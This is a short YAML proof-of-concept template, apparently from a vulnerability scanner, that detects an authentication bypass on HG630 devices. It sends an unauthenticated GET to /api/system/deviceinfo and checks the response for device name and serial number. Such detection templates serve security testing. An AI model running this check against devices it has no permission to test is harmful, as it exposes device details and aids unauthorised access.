name: poc-yaml-hg630-authentication-bypass
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /api/system/deviceinfo
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"DeviceName") && response.body.bcontains(b"SerialNumber")
expression: r0()
